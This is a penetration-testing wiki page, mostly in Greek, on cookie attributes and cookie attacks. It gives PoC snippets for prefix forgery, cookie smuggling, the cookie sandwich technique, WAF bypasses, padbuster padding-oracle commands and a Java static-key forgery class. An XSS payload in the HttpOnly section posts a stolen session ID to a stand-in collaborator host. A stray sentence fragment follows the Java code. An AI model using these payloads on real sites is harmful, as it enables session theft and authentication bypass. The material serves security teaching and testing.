# Cookies Hacking

{{#include ../../banners/hacktricks-training.md}}

## Cookie Ιδιότητες

Cookies έρχονται με διάφορες ιδιότητες που ελέγχουν τη συμπεριφορά τους στο browser του χρήστη. Ακολουθεί μια επισκόπηση αυτών των ιδιοτήτων σε πιο παθητική φωνή:

### Expires and Max-Age

Η ημερομηνία λήξης ενός cookie καθορίζεται από την ιδιότητα `Expires`. Αντίστοιχα, η ιδιότητα `Max-age` ορίζει τον χρόνο σε δευτερόλεπτα μέχρι να διαγραφεί ένα cookie. **Επιλέξτε `Max-age` καθώς αντανακλά πιο σύγχρονες πρακτικές.**

### Domain

Οι hosts που θα λάβουν ένα cookie καθορίζονται από την ιδιότητα `Domain`. Από προεπιλογή, αυτό ορίζεται στον host που εξέδωσε το cookie, χωρίς τα subdomains του. Ωστόσο, όταν η ιδιότητα `Domain` ορίζεται ρητά, περιλαμβάνονται και τα subdomains. Αυτό κάνει την ορισμό του `Domain` μια λιγότερο περιοριστική επιλογή, χρήσιμη όταν απαιτείται κοινή χρήση cookies μεταξύ subdomains. Για παράδειγμα, το `Domain=mozilla.org` κάνει τα cookies προσβάσιμα σε subdomains όπως `developer.mozilla.org`.

### Path

Μια συγκεκριμένη διαδρομή URL που πρέπει να υπάρχει στο ζητούμενο URL για να σταλεί το header `Cookie` υποδεικνύεται από την ιδιότητα `Path`. Αυτή η ιδιότητα θεωρεί τον χαρακτήρα `/` ως διαχωριστικό φακέλων, επιτρέποντας ταίριασμα και σε υποφακέλους.

### Ordering Rules

Όταν δύο cookies φέρουν το ίδιο όνομα, αυτό που επιλέγεται για αποστολή βασίζεται σε:

- Το cookie που ταιριάζει με το μεγαλύτερο path στο ζητούμενο URL.
- Το πιο πρόσφατα ορισμένο cookie αν τα paths είναι ίδια.

### SameSite

- Η ιδιότητα `SameSite` καθορίζει εάν τα cookies αποστέλλονται σε αιτήματα που προέρχονται από third-party domains. Παρέχει τρεις ρυθμίσεις:
- **Strict**: Περιορίζει το cookie από το να αποστέλλεται σε third-party αιτήματα.
- **Lax**: Επιτρέπει το cookie να αποστέλλεται με GET αιτήματα που ξεκινούν από third-party websites.
- **None**: Επιτρέπει στο cookie να αποστέλλεται από οποιοδήποτε third-party domain.

Θυμηθείτε, κατά τη ρύθμιση των cookies, η κατανόηση αυτών των ιδιοτήτων βοηθά ώστε να συμπεριφέρονται όπως αναμένεται σε διάφορα σενάρια.

| **Τύπος Αιτήματος** | **Παράδειγμα Κώδικα**             | **Cookies Sent When** |
| ------------------ | ---------------------------------- | --------------------- |
| Link               | \<a href="...">\</a>               | NotSet\*, Lax, None   |
| Prerender          | \<link rel="prerender" href=".."/> | NotSet\*, Lax, None   |
| Form GET           | \<form method="GET" action="...">  | NotSet\*, Lax, None   |
| Form POST          | \<form method="POST" action="..."> | NotSet\*, None        |
| iframe             | \<iframe src="...">\</iframe>      | NotSet\*, None        |
| AJAX               | $.get("...")                       | NotSet\*, None        |
| Image              | \<img src="...">                   | NetSet\*, None        |

Πίνακας από [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) και ελαφρώς τροποποιημένος.\
Ένα cookie με _**SameSite**_ ιδιότητα θα **μειώσει CSRF attacks** όπου απαιτείται ενεργή συνεδρία.

**\*Σημειώστε ότι από το Chrome80 (feb/2019) η προεπιλεγμένη συμπεριφορά ενός cookie χωρίς την SameSite** **ιδιότητα θα είναι lax** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/)).\
Σημειώστε ότι προσωρινά, μετά την εφαρμογή αυτής της αλλαγής, τα **cookies χωρίς SameSite** **policy** στο Chrome θα **θεωρούνται ως None** κατά τη **πρώτη διετία των 2 λεπτών και στη συνέχεια ως Lax για top-level cross-site POST request.**

## Cookies Σημαίες

### HttpOnly

Αυτό αποτρέπει τον client από την πρόσβαση στο cookie (π.χ. μέσω Javascript: `document.cookie`)

#### **Παρακάμψεις**

- Αν η σελίδα **επιστρέφει τα cookies στην απάντηση** ενός αιτήματος (για παράδειγμα σε μια σελίδα **PHPinfo**), είναι δυνατό να καταχραστεί το XSS για να σταλεί ένα αίτημα σε αυτή τη σελίδα και να **υποκλαπούν τα cookies** από την απάντηση (δείτε παράδειγμα στο [https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)).
- Αυτό μπορεί να παρακαμφθεί με **TRACE HTTP** αιτήματα καθώς η απάντηση από τον server (αν αυτή η HTTP μέθοδος είναι διαθέσιμη) θα αντικατοπτρίζει τα cookies που στάλθηκαν. Αυτή η τεχνική ονομάζεται **Cross-Site Tracking**.
- Αυτή η τεχνική αποφεύγεται από τους σύγχρονους browsers, οι οποίοι δεν επιτρέπουν την αποστολή ενός TRACE αιτήματος από JS. Ωστόσο, έχουν βρεθεί ορισμένες παρακάμψεις σε συγκεκριμένο λογισμικό, όπως η αποστολή `\r\nTRACE` αντί για `TRACE` στο IE6.0 SP2.
- Ένας άλλος τρόπος είναι η εκμετάλλευση zero/day ευπαθειών των browsers.
- Είναι δυνατό να **overwrite HttpOnly cookies** εκτελώντας μια επίθεση Cookie Jar overflow:


{{#ref}}
cookie-jar-overflow.md
{{#endref}}

- Είναι επίσης δυνατό να χρησιμοποιηθεί η επίθεση [**Cookie Smuggling**](#cookie-smuggling) για να εξαγάγετε αυτά τα cookies
- Εάν οποιοδήποτε server-side endpoint αντικατοπτρίζει το raw session ID στην HTTP απάντηση (π.χ. μέσα σε HTML σχόλια ή σε μπλοκ debug), μπορείτε να παρακάμψετε το HttpOnly χρησιμοποιώντας ένα XSS gadget για να κάνετε fetch εκείνο το endpoint, να εφαρμόσετε regex για το μυστικό και να το εξάγετε. Παράδειγμα προτύπου XSS payload:
```js
// Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
.then(r => r.text())
.then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
```
### Secure

The request will **only** send the cookie in an HTTP request only if the request is transmitted over a secure channel (typically **HTTPS**).

## Cookies Prefixes

Cookies prefixed with `__Secure-` are required to be set alongside the `secure` flag from pages that are secured by HTTPS.

For cookies prefixed with `__Host-`, several conditions must be met:

- They must be set with the `secure` flag.
- They must originate from a page secured by HTTPS.
- They are forbidden from specifying a domain, preventing their transmission to subdomains.
- The path for these cookies must be set to `/`.

It is important to note that cookies prefixed with `__Host-` are not allowed to be sent to superdomains or subdomains. This restriction aids in isolating application cookies. Thus, employing the `__Host-` prefix for all application cookies can be considered a good practice for enhancing security and isolation.

### Overwriting cookies

So, one of the protection of `__Host-` prefixed cookies is to prevent them from being overwritten from subdomains. Preventing for example [**Cookie Tossing attacks**](cookie-tossing.md). In the talk [**Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities**](https://www.youtube.com/watch?v=F_wAzF4a7Xg) ([**paper**](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf)) it's presented that it was possible to set \_\_HOST- prefixed cookies from subdomain, by tricking the parser, for example, adding "=" at the beggining or at the beginig and the end...:

<figure><img src="../../images/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Or in PHP it was possible to add **other characters at the beginning** of the cookie name that were going to be **replaced by underscore** characters, allowing to overwrite `__HOST-` cookies:

<figure><img src="../../images/image (7) (1) (1) (1) (1).png" alt="" width="373"><figcaption></figcaption></figure>


#### Unicode whitespace cookie-name smuggling (prefix forgery)

Abuse discrepancies between browser and server parsing by prepending a Unicode whitespace code point to the cookie name. The browser won’t consider the name to literally start with `__Host-`/`__Secure-`, so it allows setting from a subdomain. If the backend trims/normalizes leading Unicode whitespace on cookie keys, it will see the protected name and may overwrite the high-privilege cookie.

- PoC from a subdomain that can set parent-domain cookies:
```js
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
```
- Τυπική συμπεριφορά backend που επιτρέπει το ζήτημα:
- Frameworks που trim/normalize τα cookie keys. Στο Django, το Python’s `str.strip()` αφαιρεί ένα μεγάλο εύρος Unicode whitespace code points, προκαλώντας το όνομα να κανονικοποιηθεί σε `__Host-name`.
- Συνήθως απομακρυνόμενα code points περιλαμβάνουν: U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680 (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288).
- Πολλά frameworks επιλύουν διπλά cookie names ως “last wins”, οπότε η attacker-controlled normalized cookie value αντικαθιστά την νόμιμη.

- Οι διαφορές ανά browser έχουν σημασία:
- Το Safari μπλοκάρει multibyte Unicode whitespace στα cookie names (π.χ. απορρίπτει U+2000) αλλά εξακολουθεί να επιτρέπει single-byte U+0085 και U+00A0, τα οποία πολλά backends αφαιρούν. Κάντε cross-test ανά browsers.

- Impact: Επιτρέπει την αντικατάσταση των `__Host-`/`__Secure-` cookies από λιγότερο αξιόπιστα contexts (subdomains), κάτι που μπορεί να οδηγήσει σε XSS (αν είναι reflected), αντικατάσταση CSRF token και session fixation.

- On-the-wire vs server view example (U+2000 present in name):
```
Cookie: __Host-name=Real; â€€__Host-name=<img src=x onerror=alert(1)>;
```
Πολλά backends διαχωρίζουν/αναλύουν και στη συνέχεια περικόπτουν, με αποτέλεσμα το κανονικοποιημένο `__Host-name` να παίρνει την τιμή του επιτιθέμενου.

#### Παραδοσιακό cookie splitting `$Version=1` σε Java backends (prefix bypass)

Ορισμένα Java stacks (π.χ. Tomcat/Jetty-style) εξακολουθούν να ενεργοποιούν την παλαιά ανάλυση RFC 2109/2965 όταν το `Cookie` header ξεκινάει με `$Version=1`. Αυτό μπορεί να οδηγήσει τον server να ερμηνεύσει ξανά ένα μοναδικό string cookie ως πολλαπλά λογικά cookies και να αποδεχτεί μια ψευδώς δημιουργημένη καταχώρηση `__Host-` που αρχικά είχε οριστεί από υποτομέα ή ακόμη και από μη ασφαλή προέλευση.

- PoC που εξαναγκάζει την παλαιά ανάλυση:
```js
document.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;
```
- Γιατί λειτουργεί:
- Οι client-side ελέγχοι prefix εφαρμόζονται κατά το set, αλλά το server-side legacy parsing στη συνέχεια διαιρεί και κανονικοποιεί το header, παρακάμπτοντας την πρόθεση των εγγυήσεων prefix `__Host-`/`__Secure-`.

- Πού να δοκιμάσετε: Tomcat, Jetty, Undertow, ή frameworks που εξακολουθούν να τιμούν τα attributes RFC 2109/2965. Συνδυάστε με semantics overwrite για duplicate-name.

#### Duplicate-name last-wins overwrite primitive

When two cookies normalize to the same name, many backends (including Django) use the last occurrence. After smuggling/legacy-splitting produces two `__Host-*` names, the attacker-controlled one will typically win.

#### Ανίχνευση και εργαλεία

Use Burp Suite to probe for these conditions:

- Δοκιμάστε πολλούς leading Unicode whitespace code points: U+2000, U+0085, U+00A0 και παρατηρήστε αν το backend κάνει trim και αντιμετωπίζει το όνομα ως prefixed.
- Στείλτε `$Version=1` πρώτα στο Cookie header και ελέγξτε αν το backend πραγματοποιεί legacy splitting/normalization.
- Παρατηρήστε την επίλυση duplicate-name (first vs last wins) εγχύοντας δύο cookies που κανονικοποιούνται στο ίδιο όνομα.
- Burp Custom Action για αυτοματοποίηση: [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

> Tip: These techniques exploit RFC 6265’s octet-vs-string gap: browsers send bytes; servers decode and may normalize/trim. Mismatches in decoding and normalization are the core of the bypass.

## Επιθέσεις Cookies

If a custom cookie contains sensitive data check it (specially if you are playing a CTF), as it might be vulnerable.

### Αποκωδικοποίηση και Τροποποίηση Cookies

Sensitive data embedded in cookies should always be scrutinized. Cookies encoded in Base64 or similar formats can often be decoded. This vulnerability allows attackers to alter the cookie's content and impersonate other users by encoding their modified data back into the cookie.

### Session Hijacking

This attack involves stealing a user's cookie to gain unauthorized access to their account within an application. By using the stolen cookie, an attacker can impersonate the legitimate user.

### Session Fixation

Σε αυτό το σενάριο, ένας attacker ξεγελάει ένα θύμα ώστε να χρησιμοποιήσει ένα συγκεκριμένο cookie για να συνδεθεί. Εάν η εφαρμογή δεν εκχωρεί νέο cookie κατά το login, ο attacker, που κατέχει το αρχικό cookie, μπορεί να μιμηθεί το θύμα. Αυτή η τεχνική βασίζεται στο να κάνει το θύμα login με cookie που παρείχε ο attacker.

If you found an **XSS in a subdomain** or you **control a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### Session Donation

Εδώ, ο attacker πείθει το θύμα να χρησιμοποιήσει το session cookie του attacker. Το θύμα, πιστεύοντας ότι είναι συνδεδεμένο στον δικό του λογαριασμό, θα εκτελεί άθελά του ενέργειες στο πλαίσιο του λογαριασμού του attacker.

If you found an **XSS in a subdomain** or you **control a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### [JWT Cookies](../hacking-jwt-json-web-tokens.md)

Click on the previous link to access a page explaining possible flaws in JWT.

JSON Web Tokens (JWT) used in cookies can also present vulnerabilities. For in-depth information on potential flaws and how to exploit them, accessing the linked document on hacking JWT is recommended.

### Cross-Site Request Forgery (CSRF)

This attack forces a logged-in user to execute unwanted actions on a web application in which they're currently authenticated. Attackers can exploit cookies that are automatically sent with every request to the vulnerable site.

### Κενά Cookies

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Οι browsers επιτρέπουν τη δημιουργία cookies χωρίς όνομα, κάτι που μπορεί να επιδειχθεί μέσω JavaScript ως εξής:
```js
document.cookie = "a=v1"
document.cookie = "=test value;" // Setting an empty named cookie
document.cookie = "b=v2"
```
Το αποτέλεσμα στην αποσταλμένη cookie κεφαλίδα είναι `a=v1; test value; b=v2;`. Ενδιαφέρον είναι ότι αυτό επιτρέπει τη χειραγώγηση των cookies εάν οριστεί ένα cookie με κενό όνομα, ενδεχομένως ελέγχοντας άλλα cookies θέτοντας το κενό cookie σε μια συγκεκριμένη τιμή:
```js
function setCookie(name, value) {
document.cookie = `${name}=${value}`
}

setCookie("", "a=b") // Setting the empty cookie modifies another cookie's value
```
Αυτό οδηγεί τον browser να στέλνει ένα cookie header που ερμηνεύεται από κάθε web server ως cookie με όνομα `a` και τιμή `b`.

#### Chrome Bug: Πρόβλημα με Unicode Surrogate Codepoint

Στο Chrome, αν ένας Unicode surrogate codepoint αποτελεί μέρος ενός set cookie, το `document.cookie` αλλοιώνεται και στη συνέχεια επιστρέφει μια κενή συμβολοσειρά:
```js
document.cookie = "\ud800=meep"
```
Αυτό έχει ως αποτέλεσμα το `document.cookie` να επιστρέφει μια κενή συμβολοσειρά, υποδεικνύοντας μόνιμη καταστροφή.

#### Cookie Smuggling λόγω προβλημάτων ανάλυσης

(Δείτε περισσότερες λεπτομέρειες στην[original research](https://blog.ankursundara.com/cookie-bugs/)) Πολλοί web servers, συμπεριλαμβανομένων αυτών από Java (Jetty, TomCat, Undertow) και Python (Zope, cherrypy, web.py, aiohttp, bottle, webob), χειρίζονται εσφαλμένα τις cookie συμβολοσειρές λόγω παρωχημένης υποστήριξης RFC2965. Διαβάζουν μια double-quoted cookie τιμή ως μία ενιαία τιμή ακόμα κι αν περιέχει semicolons, οι οποίες κανονικά θα έπρεπε να διαχωρίζουν ζεύγη κλειδί-τιμής:
```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```
#### Cookie Injection Vulnerabilities

(Δείτε περισσότερες λεπτομέρειες στην[original research](https://blog.ankursundara.com/cookie-bugs/)) Η εσφαλμένη ανάλυση των cookies από servers, ειδικά Undertow, Zope, και από αυτούς που χρησιμοποιούν τα Python `http.cookie.SimpleCookie` και `http.cookie.BaseCookie`, δημιουργεί ευκαιρίες για cookie injection attacks. Αυτοί οι servers δεν οριοθετούν σωστά την έναρξη νέων cookies, επιτρέποντας σε επιτιθέμενους να spoof cookies:

- Undertow περιμένει ένα νέο cookie αμέσως μετά από μια quoted value χωρίς ερωτηματικό (semicolon).
- Zope αναζητά ένα comma για να ξεκινήσει την ανάλυση του επόμενου cookie.
- Οι Python cookie classes ξεκινούν την ανάλυση πάνω σε έναν space χαρακτήρα.

Αυτή η ευπάθεια είναι ιδιαίτερα επικίνδυνη σε web εφαρμογές που βασίζονται σε cookie-based CSRF protection, καθώς επιτρέπει σε επιτιθέμενους να inject spoofed CSRF-token cookies, ενδεχομένως παρακάμπτοντας μέτρα ασφαλείας. Το πρόβλημα επιδεινώνεται από τον τρόπο που η Python χειρίζεται duplicate cookie names, όπου η τελευταία εμφάνιση υπερισχύει των προηγούμενων. Επίσης εγείρει ανησυχίες για `__Secure-` και `__Host-` cookies σε insecure contexts και μπορεί να οδηγήσει σε authorization bypasses όταν cookies προωθούνται σε back-end servers ευάλωτους σε spoofing.

### Cookies $version

#### WAF Bypass

Σύμφωνα με [**this blogpost**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie), μπορεί να είναι δυνατόν να χρησιμοποιηθεί το cookie attribute **`$Version=1`** ώστε το backend να χρησιμοποιήσει παλαιά λογική για να αναλύσει το cookie λόγω του **RFC2109**. Επιπλέον, άλλες τιμές όπως **`$Domain`** και **`$Path`** μπορούν να χρησιμοποιηθούν για να τροποποιήσουν τη συμπεριφορά του backend με το cookie.

#### Cookie Sandwich Attack

Σύμφωνα με [**this blogpost**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) είναι δυνατόν να χρησιμοποιηθεί η cookie sandwich technique για να κλαπούν HttpOnly cookies. Αυτά είναι τα requirements και τα βήματα:

- Βρείτε ένα σημείο όπου ένα φαινομενικά άχρηστο **cookie είναι αντανακλώμενο στην απάντηση**
- **Create a cookie called `$Version`** με value `1` (you can do this in a XSS attack from JS) με ένα πιο συγκεκριμένο path ώστε να πάρει την αρχική θέση (κάποια frameworks όπως python δεν χρειάζονται αυτό το βήμα)
- **Create the cookie that is reflected** με μια τιμή που αφήνει ένα **open double quotes** και με συγκεκριμένο path ώστε να τοποθετηθεί στο cookie db μετά από το προηγούμενο (`$Version`)
- Έπειτα, το legit cookie θα μπει μετά στη σειρά
- **Create a dummy cookie that closes the double quotes** μέσα στην τιμή του

Με αυτόν τον τρόπο το victim cookie παγιδεύεται μέσα στο νέο cookie version 1 και θα αντανακλάται όποτε γίνεται reflection. π.χ. από το post:
```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```
### Παρακάμψεις WAF

#### Cookies $version

Δείτε την προηγούμενη ενότητα.

#### Παράκαμψη value analysis με quoted-string encoding

Αυτό το parsing υποδεικνύει να unescape τις escaped τιμές μέσα στα cookies, οπότε "\a" γίνεται "a". Αυτό μπορεί να είναι χρήσιμο για να παρακαμφθούν τα WAFS ως εξής:

- `eval('test') => forbidden`
- `"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed`

#### Παράκαμψη cookie-name blocklists

Στο RFC2109 αναφέρεται ότι ένα **κόμμα μπορεί να χρησιμοποιηθεί ως διαχωριστικό μεταξύ των τιμών cookie**. Και επίσης είναι δυνατό να προστεθούν **κενά και tabs πριν και μετά το σύμβολο =**. Επομένως ένα cookie όπως `$Version=1; foo=bar, abc = qux` δεν δημιουργεί το cookie `"foo":"bar, admin = qux"` αλλά τα cookies `foo":"bar"` και `"admin":"qux"`. Σημειώστε πώς δημιουργούνται 2 cookies και πώς το admin έχασε τα κενά πριν και μετά το σύμβολο =.

#### Παράκαμψη value analysis με cookie splitting

Τέλος, διάφορα backdoors θα ενώσουν σε ένα string διαφορετικά cookies που περνιούνται σε διαφορετικά cookie headers όπως στο:
```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```
Το οποίο θα μπορούσε να επιτρέψει την παράκαμψη ενός WAF όπως στο παρακάτω παράδειγμα:
```
Cookie: name=eval('test//
Cookie: comment')

Resulting cookie: name=eval('test//, comment') => allowed
```
### Extra Vulnerable Cookies Checks

#### **Βασικοί έλεγχοι**

- Το **cookie** είναι το **ίδιο** κάθε φορά που κάνεις **login**.
- Κάνε **log out** και δοκίμασε να χρησιμοποιήσεις το ίδιο cookie.
- Δοκίμασε να κάνεις **log in** με 2 συσκευές (ή browsers) στον ίδιο λογαριασμό χρησιμοποιώντας το ίδιο cookie.
- Έλεγξε αν το cookie περιέχει κάποιες πληροφορίες και δοκίμασε να το τροποποιήσεις
- Δοκίμασε να δημιουργήσεις πολλούς λογαριασμούς με σχεδόν το ίδιο username και έλεγξε αν βλέπεις ομοιότητες.
- Έλεγξε την "**remember me**" επιλογή αν υπάρχει για να δεις πώς λειτουργεί. Αν υπάρχει και μπορεί να είναι ευάλωτη, χρησιμοποίησε πάντα το cookie του **remember me** χωρίς κανένα άλλο cookie.
- Έλεγξε αν το προηγούμενο cookie δουλεύει ακόμα και μετά την αλλαγή του password.

#### **Σύνθετες επιθέσεις σε cookies**

Αν το cookie παραμένει το ίδιο (ή σχεδόν) όταν κάνεις **log in**, αυτό πιθανώς σημαίνει ότι το cookie σχετίζεται με κάποιο πεδίο του λογαριασμού σου (πιθανώς το username). Τότε μπορείς:

- Δοκίμασε να δημιουργήσεις πολλούς **accounts** με usernames πολύ **παρόμοια** και προσπάθησε να **μαντέψεις** πώς λειτουργεί ο αλγόριθμος.
- Δοκίμασε να **bruteforce το username**. Αν το cookie χρησιμεύει μόνο ως μέθοδος πιστοποίησης για το username σου, τότε μπορείς να δημιουργήσεις έναν λογαριασμό με username "**Bmin**" και να **bruteforce** κάθε επιμέρους **bit** του cookie σου επειδή ένα από τα cookies που θα δοκιμάσεις θα είναι αυτό που ανήκει στον "**admin**".
- Δοκίμασε **Padding** **Oracle** (μπορείς να αποκρυπτογραφήσεις το περιεχόμενο του cookie). Χρησιμοποίησε **padbuster**.

**Padding Oracle - Padbuster παραδείγματα**
```bash
padbuster <URL/path/when/successfully/login/with/cookie> <COOKIE> <PAD[8-16]>
# When cookies and regular Base64
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf

# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:
padBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```
Το Padbuster θα κάνει αρκετές προσπάθειες και θα σας ρωτήσει ποια κατάσταση είναι η κατάσταση σφάλματος (αυτή που δεν είναι έγκυρη).

Στη συνέχεια θα ξεκινήσει το decrypting του cookie (μπορεί να χρειαστούν μερικά λεπτά).

Εάν η επίθεση έχει εκτελεστεί επιτυχώς, τότε μπορείτε να δοκιμάσετε να encrypt ένα string της επιλογής σας. Για παράδειγμα, αν θέλετε να **encrypt** **user=administrator**
```
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator
```
Αυτή η εκτέλεση θα σας δώσει το cookie σωστά κρυπτογραφημένο και κωδικοποιημένο με τη συμβολοσειρά **user=administrator** μέσα.

**CBC-MAC**

Ίσως ένα cookie να έχει κάποια τιμή και να υπογραφεί χρησιμοποιώντας CBC. Τότε, η ακεραιότητα της τιμής είναι η υπογραφή που δημιουργείται χρησιμοποιώντας CBC με την ίδια τιμή. Εφόσον συνιστάται να χρησιμοποιείται ως IV ένα μηδενικό διάνυσμα, αυτός ο τύπος ελέγχου ακεραιότητας μπορεί να είναι ευάλωτος.

**The attack**

1. Λάβετε την υπογραφή του username **administ** = **t**
2. Λάβετε την υπογραφή του username **rator\x00\x00\x00 XOR t** = **t'**
3. Θέστε στο cookie την τιμή **administrator+t'** (**t'** θα είναι μια έγκυρη υπογραφή του **(rator\x00\x00\x00 XOR t) XOR t** = **rator\x00\x00\x00**)

**ECB**

Αν το cookie κρυπτογραφείται χρησιμοποιώντας ECB, μπορεί να είναι ευάλωτο. Όταν συνδέεστε, το cookie που λαμβάνετε πρέπει να είναι πάντα το ίδιο.

How to detect and attack:

Δημιουργήστε 2 χρήστες με σχεδόν τα ίδια δεδομένα (username, password, email, κ.λπ.) και προσπαθήστε να ανακαλύψετε κάποιο μοτίβο μέσα στο cookie

Δημιουργήστε έναν χρήστη με όνομα για παράδειγμα "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" και ελέγξτε αν υπάρχει κάποιο μοτίβο στο cookie (καθώς το ECB κρυπτογραφεί κάθε block με το ίδιο key, τα ίδια κρυπτογραφημένα bytes μπορεί να εμφανιστούν αν το username κρυπτογραφείται).

Θα πρέπει να υπάρχει ένα μοτίβο (με το μέγεθος ενός χρησιμοποιούμενου block). Έτσι, γνωρίζοντας πώς κρυπτογραφούνται μια σειρά από "a" μπορείτε να δημιουργήσετε ένα username: "a"\*(size of the block)+"admin". Στη συνέχεια, μπορείτε να διαγράψετε το κρυπτογραφημένο μοτίβο ενός block από "a" από το cookie. Και θα έχετε το cookie του username "admin".

### Static-key cookie forgery (symmetric encryption of predictable IDs)

Ορισμένες εφαρμογές εκδίδουν authentication cookies κρυπτογραφώντας μόνο μια προβλέψιμη τιμή (π.χ. ο αριθμητικός user ID) με ένα global, hard-coded symmetric key και στη συνέχεια κωδικοποιούν το ciphertext (hex/base64). Αν το key είναι static ανά product (ή ανά install), οποιοσδήποτε μπορεί να πλαστογραφήσει cookies για αυθαίρετους χρήστες offline και να παρακάμψει την authentication.

How to test/forge
- Εντοπίστε τα cookie που ορίζουν την auth, π.χ., COOKIEID και ADMINCOOKIEID.
- Προσδιορίστε cipher/encoding. Σε ένα πραγματικό περιστατικό η εφαρμογή χρησιμοποίησε IDEA με ένα σταθερό 16-byte key και επέστρεψε το ciphertext ως hex.
- Επαληθεύστε κρυπτογραφώντας τον δικό σας user ID και συγκρίνοντάς τον με το εκδιδόμενο cookie. Αν ταιριάζει, μπορείτε να δημιουργήσετε cookies για οποιοδήποτε target ID (1 συχνά αντιστοιχεί στον πρώτο admin).
- Ορίστε την πλαστογραφημένη τιμή απευθείας ως cookie και περιηγηθείτε· δεν χρειάζονται credentials.

<details>
<summary>Ελάχιστο Java PoC (IDEA + hex) που χρησιμοποιήθηκε σε πραγματικό περιβάλλον</summary>
```java
import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;

public class App {
private String ideaKey = "1234567890123456"; // example static key

public String encode(char[] plainArray) { return encode(new String(plainArray)); }

public String encode(String plain) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA encrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
encrypt.initEncrypt(key);
} catch (KeyException e) { return null; }
if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt.getInputBlockSize(); currentPad++) {
plain = plain + " "; // space padding
}
}
byte[] encrypted = encrypt.update(plain.getBytes());
return Hex.toString(encrypted); // cookie expects hex
}

public String decode(String chiffre) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA decrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
decrypt.initDecrypt(key);
} catch (KeyException e) { return null; }
byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
try { return new String(decrypted, "ISO_8859-1").trim(); } catch (UnsupportedEncodingException e) { return null; }
}

public void setKey(String key) { this.ideaKey = key; }
}
```
</details>συμφραζόμενα (π.χ., server-side session with random ID, ή προσθέστε anti-replay properties).

## Αναφορές

- [Όταν οι Έλεγχοι Αποτυγχάνουν: Τέσσερις Κρίσιμες Pre-Auth Ευπάθειες στο TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://blog.ankursundara.com/cookie-bugs/](https://blog.ankursundara.com/cookie-bugs/)
- [https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd](https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd)
- [https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [https://seclists.org/webappsec/2006/q2/181](https://seclists.org/webappsec/2006/q2/181)
- [https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [Cookie Chaos: Πώς να παρακάμψετε τα __Host και __Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [Burp Custom Action – CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

{{#include ../../banners/hacktricks-training.md}}
